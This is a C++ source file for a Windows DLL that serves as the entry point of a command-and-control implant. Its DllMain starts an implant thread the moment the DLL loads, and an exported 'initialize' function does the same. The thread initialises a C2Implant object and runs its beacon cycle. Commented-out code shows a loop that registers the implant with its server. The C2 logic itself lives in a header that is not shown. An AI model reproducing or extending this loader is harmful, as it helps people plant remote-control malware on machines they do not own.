#include <windows.h>
#include "core/c2.h"

DWORD WINAPI ImplantThread(LPVOID)
{
    C2Implant c2implant;
    c2implant.init();
    //C2Implant implant;

    //while (1) {
    //    //on success, break to implant.cycle()
    //    if (c2implant.register_implant() == 1) {
    //        break;
    //    }
    //    //get rid of me, just a debug to prevent a register loop
    //    Sleep(5000);
    //}

    c2implant.cycle();
    return 0;
}

//https://learn.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170
// have to do extern c cuz otherwise C++ mangles it
extern "C" __declspec(dllexport) void __cdecl initialize() {
    CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
        break;
    }
    return TRUE;
}